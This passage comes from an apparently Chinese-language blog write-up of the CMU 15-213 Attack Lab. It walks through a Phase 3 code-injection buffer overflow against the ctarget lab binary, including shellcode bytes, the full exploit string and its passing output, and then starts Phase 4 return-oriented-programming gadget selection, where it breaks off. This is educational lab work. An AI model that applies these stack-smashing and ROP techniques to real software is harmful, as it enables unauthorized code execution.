&lt;p&gt;对&lt;code&gt;touch3&lt;/code&gt;进行反汇编可得：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Dump of assembler code for function touch3:
   0x00000000004018fa &amp;lt;+0&amp;gt;:     push   %rbx
   0x00000000004018fb &amp;lt;+1&amp;gt;:     mov    %rdi,%rbx
   0x00000000004018fe &amp;lt;+4&amp;gt;:     movl   $0x3,0x202bd4(%rip)        # 0x6044dc &amp;lt;vlevel&amp;gt;
   0x0000000000401908 &amp;lt;+14&amp;gt;:    mov    %rdi,%rsi
   0x000000000040190b &amp;lt;+17&amp;gt;:    mov    0x202bd3(%rip),%edi        # 0x6044e4 &amp;lt;cookie&amp;gt;
   0x0000000000401911 &amp;lt;+23&amp;gt;:    callq  0x40184c &amp;lt;hexmatch&amp;gt;
   0x0000000000401916 &amp;lt;+28&amp;gt;:    test   %eax,%eax
   0x0000000000401918 &amp;lt;+30&amp;gt;:    je     0x40193d &amp;lt;touch3+67&amp;gt;
   0x000000000040191a &amp;lt;+32&amp;gt;:    mov    %rbx,%rdx
   0x000000000040191d &amp;lt;+35&amp;gt;:    mov    $0x403138,%esi
   0x0000000000401922 &amp;lt;+40&amp;gt;:    mov    $0x1,%edi
   0x0000000000401927 &amp;lt;+45&amp;gt;:    mov    $0x0,%eax
   0x000000000040192c &amp;lt;+50&amp;gt;:    callq  0x400df0 &amp;lt;__printf_chk@plt&amp;gt;
   0x0000000000401931 &amp;lt;+55&amp;gt;:    mov    $0x3,%edi
   0x0000000000401936 &amp;lt;+60&amp;gt;:    callq  0x401c8d &amp;lt;validate&amp;gt;
   0x000000000040193b &amp;lt;+65&amp;gt;:    jmp    0x40195e &amp;lt;touch3+100&amp;gt;
   0x000000000040193d &amp;lt;+67&amp;gt;:    mov    %rbx,%rdx
   0x0000000000401940 &amp;lt;+70&amp;gt;:    mov    $0x403160,%esi
   0x0000000000401945 &amp;lt;+75&amp;gt;:    mov    $0x1,%edi
   0x000000000040194a &amp;lt;+80&amp;gt;:    mov    $0x0,%eax
   0x000000000040194f &amp;lt;+85&amp;gt;:    callq  0x400df0 &amp;lt;__printf_chk@plt&amp;gt;
   0x0000000000401954 &amp;lt;+90&amp;gt;:    mov    $0x3,%edi
   0x0000000000401959 &amp;lt;+95&amp;gt;:    callq  0x401d4f &amp;lt;fail&amp;gt;
   0x000000000040195e &amp;lt;+100&amp;gt;:   mov    $0x0,%edi
   0x0000000000401963 &amp;lt;+105&amp;gt;:   callq  0x400e40 &amp;lt;exit@plt&amp;gt;
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对&lt;code&gt;hexmatch&lt;/code&gt;进行反汇编可得：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Dump of assembler code for function hexmatch:
   0x000000000040184c &amp;lt;+0&amp;gt;:     push   %r12
   0x000000000040184e &amp;lt;+2&amp;gt;:     push   %rbp
   0x000000000040184f &amp;lt;+3&amp;gt;:     push   %rbx
   0x0000000000401850 &amp;lt;+4&amp;gt;:     add    $0xffffffffffffff80,%rsp
   0x0000000000401854 &amp;lt;+8&amp;gt;:     mov    %edi,%r12d
   0x0000000000401857 &amp;lt;+11&amp;gt;:    mov    %rsi,%rbp
   0x000000000040185a &amp;lt;+14&amp;gt;:    mov    %fs:0x28,%rax
   0x0000000000401863 &amp;lt;+23&amp;gt;:    mov    %rax,0x78(%rsp)
   0x0000000000401868 &amp;lt;+28&amp;gt;:    xor    %eax,%eax
   0x000000000040186a &amp;lt;+30&amp;gt;:    callq  0x400db0 &amp;lt;random@plt&amp;gt;
   0x000000000040186f &amp;lt;+35&amp;gt;:    mov    %rax,%rcx
   0x0000000000401872 &amp;lt;+38&amp;gt;:    movabs $0xa3d70a3d70a3d70b,%rdx
   0x000000000040187c &amp;lt;+48&amp;gt;:    imul   %rdx
   0x000000000040187f &amp;lt;+51&amp;gt;:    add    %rcx,%rdx
   0x0000000000401882 &amp;lt;+54&amp;gt;:    sar    $0x6,%rdx
   0x0000000000401886 &amp;lt;+58&amp;gt;:    mov    %rcx,%rax
   0x0000000000401889 &amp;lt;+61&amp;gt;:    sar    $0x3f,%rax
   0x000000000040188d &amp;lt;+65&amp;gt;:    sub    %rax,%rdx
   0x0000000000401890 &amp;lt;+68&amp;gt;:    lea    (%rdx,%rdx,4),%rax
   0x0000000000401894 &amp;lt;+72&amp;gt;:    lea    (%rax,%rax,4),%rax
   0x0000000000401898 &amp;lt;+76&amp;gt;:    shl    $0x2,%rax
   0x000000000040189c &amp;lt;+80&amp;gt;:    sub    %rax,%rcx
   0x000000000040189f &amp;lt;+83&amp;gt;:    lea    (%rsp,%rcx,1),%rbx
   0x00000000004018a3 &amp;lt;+87&amp;gt;:    mov    %r12d,%r8d
   0x00000000004018a6 &amp;lt;+90&amp;gt;:    mov    $0x4030e2,%ecx
   0x00000000004018ab &amp;lt;+95&amp;gt;:    mov    $0xffffffffffffffff,%rdx
   0x00000000004018b2 &amp;lt;+102&amp;gt;:   mov    $0x1,%esi
   0x00000000004018b7 &amp;lt;+107&amp;gt;:   mov    %rbx,%rdi
   0x00000000004018ba &amp;lt;+110&amp;gt;:   mov    $0x0,%eax
   0x00000000004018bf &amp;lt;+115&amp;gt;:   callq  0x400e70 &amp;lt;__sprintf_chk@plt&amp;gt;
   0x00000000004018c4 &amp;lt;+120&amp;gt;:   mov    $0x9,%edx
   0x00000000004018c9 &amp;lt;+125&amp;gt;:   mov    %rbx,%rsi
   0x00000000004018cc &amp;lt;+128&amp;gt;:   mov    %rbp,%rdi
   0x00000000004018cf &amp;lt;+131&amp;gt;:   callq  0x400ca0 &amp;lt;strncmp@plt&amp;gt;
   0x00000000004018d4 &amp;lt;+136&amp;gt;:   test   %eax,%eax
   0x00000000004018d6 &amp;lt;+138&amp;gt;:   sete   %al
   0x00000000004018d9 &amp;lt;+141&amp;gt;:   movzbl %al,%eax
   0x00000000004018dc &amp;lt;+144&amp;gt;:   mov    0x78(%rsp),%rsi
   0x00000000004018e1 &amp;lt;+149&amp;gt;:   xor    %fs:0x28,%rsi
   0x00000000004018ea &amp;lt;+158&amp;gt;:   je     0x4018f1 &amp;lt;hexmatch+165&amp;gt;
   0x00000000004018ec &amp;lt;+160&amp;gt;:   callq  0x400ce0 &amp;lt;__stack_chk_fail@plt&amp;gt;
   0x00000000004018f1 &amp;lt;+165&amp;gt;:   sub    $0xffffffffffffff80,%rsp
   0x00000000004018f5 &amp;lt;+169&amp;gt;:   pop    %rbx
   0x00000000004018f6 &amp;lt;+170&amp;gt;:   pop    %rbp
   0x00000000004018f7 &amp;lt;+171&amp;gt;:   pop    %r12
   0x00000000004018f9 &amp;lt;+173&amp;gt;:   retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对&lt;code&gt;strncmp&lt;/code&gt;进行反汇编可得：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Dump of assembler code for function strncmp_ifunc:
   0x00007ffff7e54710 &amp;lt;+0&amp;gt;:     endbr64
   0x00007ffff7e54714 &amp;lt;+4&amp;gt;:     mov    0x14c745(%rip),%rcx        # 0x7ffff7fa0e60
   0x00007ffff7e5471b &amp;lt;+11&amp;gt;:    lea    0xe4b0e(%rip),%rax        # 0x7ffff7f39230 &amp;lt;__strncmp_avx2&amp;gt;
   0x00007ffff7e54722 &amp;lt;+18&amp;gt;:    movabs $0x90000000002,%rdx
   0x00007ffff7e5472c &amp;lt;+28&amp;gt;:    movabs $0x10000000002,%rsi
   0x00007ffff7e54736 &amp;lt;+38&amp;gt;:    and    0xc8(%rcx),%rdx
   0x00007ffff7e5473d &amp;lt;+45&amp;gt;:    cmp    %rsi,%rdx
   0x00007ffff7e54740 &amp;lt;+48&amp;gt;:    je     0x7ffff7e54772 &amp;lt;strncmp_ifunc+98&amp;gt;
   0x00007ffff7e54742 &amp;lt;+50&amp;gt;:    mov    0x70(%rcx),%edx
   0x00007ffff7e54745 &amp;lt;+53&amp;gt;:    test   $0x100000,%edx
   0x00007ffff7e5474b &amp;lt;+59&amp;gt;:    je     0x7ffff7e5475d &amp;lt;strncmp_ifunc+77&amp;gt;
   0x00007ffff7e5474d &amp;lt;+61&amp;gt;:    lea    0xdf78c(%rip),%rax        # 0x7ffff7f33ee0 &amp;lt;__strncmp_sse42&amp;gt;
   0x00007ffff7e54754 &amp;lt;+68&amp;gt;:    testb  $0x80,0xcc(%rcx)
   0x00007ffff7e5475b &amp;lt;+75&amp;gt;:    je     0x7ffff7e54772 &amp;lt;strncmp_ifunc+98&amp;gt;
   0x00007ffff7e5475d &amp;lt;+77&amp;gt;:    and    $0x2,%dh
   0x00007ffff7e54760 &amp;lt;+80&amp;gt;:    lea    0xaef9(%rip),%rax        # 0x7ffff7e5f660 &amp;lt;__strncmp_sse2&amp;gt;
   0x00007ffff7e54767 &amp;lt;+87&amp;gt;:    lea    0xc51a2(%rip),%rdx        # 0x7ffff7f19910 &amp;lt;__strncmp_ssse3&amp;gt;
   0x00007ffff7e5476e &amp;lt;+94&amp;gt;:    cmovne %rdx,%rax
   0x00007ffff7e54772 &amp;lt;+98&amp;gt;:    retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中与栈相关的指令包括：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;hex2match前(touch3中)：
    push   %rbx
    callq hex2match
hex2match:
   0x000000000040184c &amp;lt;+0&amp;gt;:     push   %r12
   0x000000000040184e &amp;lt;+2&amp;gt;:     push   %rbp
   0x000000000040184f &amp;lt;+3&amp;gt;:     push   %rbx

   0x00000000004018f5 &amp;lt;+169&amp;gt;:   pop    %rbx
   0x00000000004018f6 &amp;lt;+170&amp;gt;:   pop    %rbp
   0x00000000004018f7 &amp;lt;+171&amp;gt;:   pop    %r12
                                retq
hex2match后：
    callq strncmp
strncmp:
    retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;由于&lt;code&gt;hexmatch&lt;/code&gt;和&lt;code&gt;strncmp&lt;/code&gt;是在&lt;code&gt;touch3&lt;/code&gt;里面调用的，而&lt;code&gt;touch3&lt;/code&gt;是在执行攻击代码之后调用，在攻击代码中我们将&lt;code&gt;%rdi&lt;/code&gt;指向字符串的地址，因此我们需要保证的是&lt;code&gt;touch3&lt;/code&gt;中的&lt;code&gt;push&lt;/code&gt;和&lt;code&gt;pop&lt;/code&gt;指令不影响之前的字符串，以免影响&lt;code&gt;%rdi&lt;/code&gt;指向的值。&lt;/p&gt;
&lt;p&gt;在调用&lt;code&gt;touch3&lt;/code&gt;之前，我们刚刚执行了&lt;code&gt;ret&lt;/code&gt;指令，其作用是将返回地址赋值给&lt;code&gt;%rip&lt;/code&gt;并弹出，操作完成后&lt;code&gt;%rsp&lt;/code&gt;应该在&lt;code&gt;buf + 48&lt;/code&gt;位置处。我们是通过直接返回到&lt;code&gt;touch3&lt;/code&gt;的开头位置来执行&lt;code&gt;touch3&lt;/code&gt;的，而不是&lt;code&gt;callq touch3&lt;/code&gt;，因此无需往栈中压入下一条指令的地址（当然这里也没有下一条啦~）&lt;/p&gt;
&lt;p&gt;通过上述过程分析我们可以看到，栈的最低位置应该是在经过了一下几个步骤之后：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;push %rbx&lt;/code&gt;，这里压入了 rbx，栈位置来到了&lt;code&gt;buf + 40&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;callq hex2match&lt;/code&gt;，这里压入了&lt;code&gt;callq&lt;/code&gt;的下一条指令的地址，栈位置来到了&lt;code&gt;buf + 32&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;push r12&lt;/code&gt;，压入了&lt;code&gt;r12&lt;/code&gt;，栈位置来到了&lt;code&gt;buf + 24&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;push rbp&lt;/code&gt;，压入了&lt;code&gt;rbp&lt;/code&gt;，栈位置来到了&lt;code&gt;buf + 16&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;push rbx&lt;/code&gt;，压入了&lt;code&gt;rbx&lt;/code&gt;，栈位置来到了&lt;code&gt;buf + 8&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;后续主要执行的都是&lt;code&gt;pop&lt;/code&gt;和&lt;code&gt;retq&lt;/code&gt;操作，虽然有一个&lt;code&gt;callq strncmp&lt;/code&gt;，但是栈的位置不可能低于&lt;code&gt;buf + 8&lt;/code&gt;。因此我们插入的字符串必须在&lt;code&gt;buf + 8&lt;/code&gt;之前。我们输入的字符串刚好是 8 个字符，1 个字符一个字节，也刚好是 8 个字节，那么就应当插在&lt;code&gt;buf&lt;/code&gt;处。从&lt;code&gt;buf + 8&lt;/code&gt;处开始插入攻击代码。&lt;/p&gt;
&lt;p&gt;此外：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;59b997fa&lt;/code&gt;的字符串编码应该是：&lt;code&gt;0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61&lt;/code&gt;（插在攻击代码前）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;buf + 8&lt;/code&gt;处的地址是：&lt;code&gt;0x5561dc80&lt;/code&gt;（插入返回地址部分），转化成小端法应该是&lt;code&gt;80 dc 61 55&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;touch3&lt;/code&gt;的地址是&lt;code&gt;0x4018fa&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;那么我们的攻击指令应该是：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;movl $0x5561dc78,%edi
subq $0x8,%rsp
movl $0x4018fa,(%rsp)
ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将其放入&lt;code&gt;ph3.s&lt;/code&gt;中，输入&lt;code&gt;gcc -c ph3.s&lt;/code&gt;得到&lt;code&gt;ph3.o&lt;/code&gt;，输入&lt;code&gt;objdump -d ph3.o &amp;gt; ph3.d&lt;/code&gt;，得到&lt;code&gt;ph3.d&lt;/code&gt;文件如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
ph3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &amp;lt;.text&amp;gt;:
   0:	bf 78 dc 61 55       	mov    $0x5561dc78,%edi
   5:	48 83 ec 08          	sub    $0x8,%rsp
   9:	c7 04 24 fa 18 40 00 	movl   $0x4018fa,(%rsp)
  10:	c3                   	retq
  11:	90                   	nop
  12:	90                   	nop
  13:	90                   	nop
  14:	90                   	nop
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;那么其字节应该是&lt;code&gt;bf 78 dc 61 55 48 83 ec 08 c7 04 24 fa 18 40 00 c3&lt;/code&gt;。一共 17 个字节，加上最前面 8 个字节，一共 25 个字节。最后插入 15 个字节的&lt;code&gt;nop&lt;/code&gt;。&lt;br&gt;执行过程中内存情况如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/48xb 0x5561dc78
0x5561dc78:     0x35    0x39    0x62    0x39    0x39    0x37    0x66    0x61
0x5561dc80:     0xbf    0x78    0xdc    0x61    0x55    0x48    0x83    0xec
0x5561dc88:     0x08    0xc7    0x04    0x24    0xfa    0x18    0x40    0x00
0x5561dc90:     0xc3    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0x5561dc98:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0x5561dca0:     0x80    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;而这里我们打印值后发现我们的&lt;code&gt;%edi&lt;/code&gt;所指向的字符串如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/s $rdi
0x5561dc78:     &amp;quot;59b997fa\277x\334aUH\203\354\b\307\004$\372\030@&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;而&lt;code&gt;cookie&lt;/code&gt;的值如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) p /x cookie
$14 = 0x59b997fa
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;但是后来这个&lt;code&gt;buf&lt;/code&gt;的空间就变成了这样：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;5: x/48xb 0x5561dc78
0x5561dc78:     0x00    0x2e    0x40    0xcb    0xed    0x3e    0x25    0xb2
0x5561dc80:     0x78    0xdc    0x61    0x55    0x00    0x00    0x00    0x00
0x5561dc88:     0xe8    0x5f    0x68    0x55    0x00    0x00    0x00    0x00
0x5561dc90:     0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x5561dc98:     0x16    0x19    0x40    0x00    0x00    0x00    0x00    0x00
0x5561dca0:     0x00    0x60    0x58    0x55    0x00    0x00    0x00    0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;但是我们后来发现，这里栈的内容被完全改变了，而且字符串的后面忘了加&lt;code&gt;\0&lt;/code&gt;字符。所以这里是有一些问题的。&lt;/p&gt;
&lt;h4 id=&#34;正确的解答&#34;&gt;&lt;a href=&#34;#正确的解答&#34; class=&#34;headerlink&#34; title=&#34;正确的解答&#34;&gt;&lt;/a&gt;正确的解答&lt;/h4&gt;&lt;p&gt;经过查阅一些&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82MDcyNDk0OA==&#34;&gt;网上的资料&lt;/span&gt;发现，我在阅读 C 语言代码的时候忽略了这 2 行：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;char cbuf[110];
/* Make position of check string unpredictable */
char *s = cbuf + random() % 100;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;那么&lt;code&gt;hexmatch&lt;/code&gt;和&lt;code&gt;strncmp&lt;/code&gt;中分配的空间就是随机的。那么我们所做出的改变应该是让插入的字符串放在父函数&lt;code&gt;test&lt;/code&gt;的位置，然后让&lt;code&gt;%rdi&lt;/code&gt;指向&lt;code&gt;test&lt;/code&gt;栈空间中的位置。&lt;code&gt;test&lt;/code&gt;函数的位置在返回地址下面，那么应该是&lt;code&gt;buf + 48&lt;/code&gt;即&lt;code&gt;0x5561dca8&lt;/code&gt;。其字符&lt;code&gt;bf 78 dc 61 55 48 83 ec 00&lt;/code&gt;应该在返回地址后面。而攻击代码也应该改为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;movl $0x5561dca8,%edi
subq $0x8,%rsp
movl $0x4018fa,(%rsp)
ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;中间两行代码可以改为&lt;code&gt;pushq $0x4018fa&lt;/code&gt;。由此，我们在&lt;code&gt;ph3.s&lt;/code&gt;中放入如下内容：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;movl $0x5561dca8,%edi
pushq $0x4018fa
ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;后续步骤和前述一样，我们生成其汇编代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
ph3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &amp;lt;.text&amp;gt;:
   0:	bf a0 dc 61 55       	mov    $0x5561dca8,%edi
   5:	68 fa 18 40 00       	pushq  $0x4018fa
   a:	c3                   	retq
   b:	90                   	nop
   c:	90                   	nop
   d:	90                   	nop
   e:	90                   	nop
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这次我们不把汇编代码插入&lt;code&gt;buf + 8&lt;/code&gt;了，因为没有意义，我们直接将其插入汇编代码开头即可。最后的 8 个字节返回地址改为&lt;code&gt;0x5561dc78&lt;/code&gt;。其前面的内容为&lt;code&gt;bf a0 dc 61 55 68 fa 18 40 00 c3&lt;/code&gt;，共 11 个字节。插入 29 个&lt;code&gt;nop&lt;/code&gt;(0x90)。在插入 8 个字节的返回地址（&lt;code&gt;0x000000005561dc78&lt;/code&gt;）。最后放入 9 个字节的字符串&lt;code&gt;0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61 0x00&lt;/code&gt;。最后结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;bash&#34;&gt;Cookie: 0x59b997fa
Type string:Touch3!: You called touch3(&amp;quot;59b997fa&amp;quot;)
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:BF A8 DC 61 55 68 FA 18 40 00 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过！&lt;/p&gt;
&lt;h2 id=&#34;Part-II-Return-oriented-Programming-attack&#34;&gt;&lt;a href=&#34;#Part-II-Return-oriented-Programming-attack&#34; class=&#34;headerlink&#34; title=&#34;Part II: Return oriented Programming attack&#34;&gt;&lt;/a&gt;Part II: Return oriented Programming attack&lt;/h2&gt;&lt;p&gt;&lt;code&gt;rtarget&lt;/code&gt;的攻击要比&lt;code&gt;ctarget&lt;/code&gt;难一些，因为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;开启了栈随机化，程序的地址难以预测&lt;/li&gt;
&lt;li&gt;开启了 Non-executable 位，导致我们插入的代码部分难以执行&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;因此，我们使用一种新的方法：return oriented programming attacks。它的核心在于利用已有的程序，而不是注入代码。每个 gadget 是一个代码段，每个 gadget 的最后都是&lt;code&gt;ret&lt;/code&gt;指令（编码&lt;code&gt;c3&lt;/code&gt;），将这个自己和其前面的部分字节组合起来，可以合成我们想要的指令。此外，针对 x86_64，我们不一定要利用整条指令，有的时候一条指令的一部分字节又可以组成另一条指令。所有 gadget 的地址被压在栈上，每次调用&lt;code&gt;ret&lt;/code&gt;之后就会返回到下一个 gadget 的地址。&lt;/p&gt;
&lt;h3 id=&#34;Phase-4&#34;&gt;&lt;a href=&#34;#Phase-4&#34; class=&#34;headerlink&#34; title=&#34;Phase 4&#34;&gt;&lt;/a&gt;Phase 4&lt;/h3&gt;&lt;p&gt;利用&lt;code&gt;rop&lt;/code&gt;重做 Phase 2 的实验，可以使用&lt;code&gt;movq, popq, ret, nop&lt;/code&gt;指令以及前 8 个寄存器(&lt;code&gt;%rax–%rdi&lt;/code&gt;)&lt;br&gt;提示：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;可以在&lt;code&gt;start_farm&lt;/code&gt;和&lt;code&gt;mid_farm&lt;/code&gt;之间寻找 gadget&lt;/li&gt;
&lt;li&gt;可以只使用 2 个 gadget&lt;/li&gt;
&lt;li&gt;当一个 gadget 使用&lt;code&gt;popq&lt;/code&gt;指令时，它从栈上弹出一个数值，所以你的攻击字符串可以是 gadget 地址和数值的组合。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Phase 2 的目的是让&lt;code&gt;test()&lt;/code&gt;跳转到&lt;code&gt;touch2&lt;/code&gt;函数，并且需要让&lt;code&gt;%edi&lt;/code&gt;的值等于&lt;code&gt;cookie&lt;/code&gt;的值。&lt;/p&gt;
&lt;p&gt;我们当时做题的主要过程是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;让最后的转移地址为&lt;code&gt;buf&lt;/code&gt;开头的位置(&lt;code&gt;0x5561dc78&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;在&lt;code&gt;buf&lt;/code&gt;中存储攻击指令&lt;ol&gt;
&lt;li&gt;让&lt;code&gt;%edi = *0x6054e4&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;将&lt;code&gt;touch2&lt;/code&gt;的地址压入栈中，&lt;code&gt;pushq 0x4017ec&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;调用&lt;code&gt;ret&lt;/code&gt;返回&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;我们在 phase 2 中需要插入的代码是：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    movq $0x6054e4,%rax
    movq (%rax),%rdi
    subq $0x8,%rsp
    movq $0x4017ec,(%rsp)
    ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里的变化在于，我们不需要使用&lt;code&gt;buf&lt;/code&gt;来存储攻击指令了，而是在整个程序中寻找攻击指令。把第一个 gadget 的地址放在返回地址处，把第二个 gadget 的地址放在第一个 gadget 后面。以此类推。我们的目的是找到所有的 gadget。&lt;/p&gt;
&lt;p&gt;但是其实这段代码可以通过把&lt;code&gt;0x6054e4&lt;/code&gt;和&lt;code&gt;0x6017ec&lt;/code&gt;两个值压在栈上。首先利用一个&lt;code&gt;popq&lt;/code&gt;指令将其弹出到&lt;code&gt;%rax&lt;/code&gt;中，然后将&lt;code&gt;%rax&lt;/code&gt;处的值移动到&lt;code&gt;%rdi&lt;/code&gt;上。我们可以这样设计栈帧：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/frame.png&#34; alt=&#34;frame.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;第一个&lt;code&gt;gadget&lt;/code&gt;中的代码是：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;movq %rsp, %rxx
popq %rax
movq (%rax),%rdi
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第二个&lt;code&gt;gadget&lt;/code&gt;中的代码是：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;popq %rax
movq %rax,(%rxx)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用&lt;code&gt;popq %rax&lt;/code&gt;是因为，&lt;code&gt;popq&lt;/code&gt;有 8 种可能的结果，而只有&lt;code&gt;popq %rax&lt;/code&gt;出现在代码的字节中，因此我们从这里出发。我们翻译一下&lt;code&gt;movq (%rax),%rdi&lt;/code&gt;，其字节编码为&lt;code&gt;48 8b 38&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;但是我们发现其实不用那么麻烦，也就是说不用保存之前的&lt;code&gt;%rsp&lt;/code&gt;，这是因为我们可以通过&lt;code&gt;gadget&lt;/code&gt;中的&lt;code&gt;ret&lt;/code&gt;指令弹出后 8 个字节的地址并且首先跳转，那么就无需把&lt;code&gt;touch3&lt;/code&gt;的地址保存在最开始的部分。栈空间可以简化成如下情况：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/frame1.png&#34; alt=&#34;frame1.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是我们发现一个问题，就是&lt;code&gt;movq (%rax),%rdi&lt;/code&gt;这条指令所对应的字节在源程序中找不到，因此我们需要采取一个更加优化的办法，就是不在栈上保存&lt;code&gt;cookie&lt;/code&gt;的地址，而是直接保存&lt;code&gt;cookie&lt;/code&gt;的值，&lt;code&gt;cookie&lt;/code&gt;的值为&lt;code&gt;0x59b997fa&lt;/code&gt;，那么栈空间可以简化成如下情况：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/frame3.png&#34; alt=&#34;frame3.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;这样只需要两条指令就可以做到了。这两条指令的编码是&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
gadget.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &amp;lt;.text&amp;gt;:
   0:	58                   	pop    %rax
   1:	48 89 c7             	mov    %rax,%rdi
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;但是这两条指令我们无法在同一处找到，因此需要划分为 2 个&lt;code&gt;gadget&lt;/code&gt;。且两条后面的都必须接数个&lt;code&gt;90&lt;/code&gt;（&lt;code&gt;nop&lt;/code&gt;）加上一个&lt;code&gt;c3&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;第一个的地址是&lt;code&gt;4019ab&lt;/code&gt;或&lt;code&gt;4019cc&lt;/code&gt;。第二个的地址是&lt;code&gt;4019a2&lt;/code&gt;或者&lt;code&gt;4019c5&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;我们这里使用&lt;code&gt;4019ab&lt;/code&gt;和&lt;code&gt;4019a2&lt;/code&gt;两个&lt;code&gt;gadget&lt;/code&gt;。第一个中存储&lt;code&gt;pop %rax&lt;/code&gt;指令，第二个中存储&lt;code&gt;mov %rax, %rdi&lt;/code&gt;指令。最后的栈空间如下：&lt;/p&gt;
